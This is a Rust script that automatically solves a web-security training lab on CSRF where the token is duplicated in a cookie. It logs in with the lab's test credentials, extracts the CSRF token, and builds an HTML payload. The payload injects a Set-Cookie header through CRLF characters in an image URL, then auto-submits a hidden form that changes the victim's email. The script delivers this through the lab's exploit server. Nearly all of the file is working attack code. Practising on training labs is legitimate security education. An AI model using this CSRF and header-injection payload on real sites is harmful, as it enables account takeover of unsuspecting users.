/**********************************************************************************
*
* Lab: CSRF where token is duplicated in cookie
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie
*      3. Login as wiener
*      4. Fetch wiener profile
*      5. Extract the csrf token that is needed for email update
*      6. Craft an HTML form for changing the email address that includes
*         the extracted csrf token and an img tag which is used to set the csrf
*         cookie via its src and submit the form via its error handler
*      7. Deliver the exploit to the victim
*      8. The victim's email will be changed after they trigger the exploit
*
***********************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a33009f03e61c6384ae775d007e00e3.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a2b00a203151cc784f6763d01d100dc.exploit-server.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client(Policy::none());
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let mut session = get_session_from_multiple_cookies(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ");
    flush_terminal();

    let login_as_wiener = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Fetching wiener profile.. ");
    flush_terminal();

    session = get_session_cookie(&login_as_wiener);
    let wiener_profile = fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    print!("⦗5⦘ Extracting the csrf token that is needed for email update.. ");
    flush_terminal();

    csrf_token = get_csrf_token(wiener_profile);
    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<html>
                <body>
                <form action="{LAB_URL}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="{csrf_token}" />
                    <input type="submit" value="Submit request" />
                </form>
                <img src="{LAB_URL}/?search=boo%0d%0aSet-Cookie: csrf={csrf_token}; SameSite=None" onerror=document.forms[0].submit()>
                </body>
            </html>
      "###
    );

    println!("{}", "OK".green());
    print!("⦗6⦘ Delivering the exploit to the victim.. ");
    flush_terminal();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The victim's email will be changed after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client(policy: Policy) -> Client {
    ClientBuilder::new()
        .redirect(policy)
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}; csrf={csrf_token}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    let web_client = build_web_client(Policy::default());
    web_client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_from_multiple_cookies(response: &Response) -> String {
    let headers = response.headers();
    let mut cookie_header = headers.get_all("set-cookie").iter();
    let second_cookie = cookie_header.nth(1).unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", second_cookie)
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
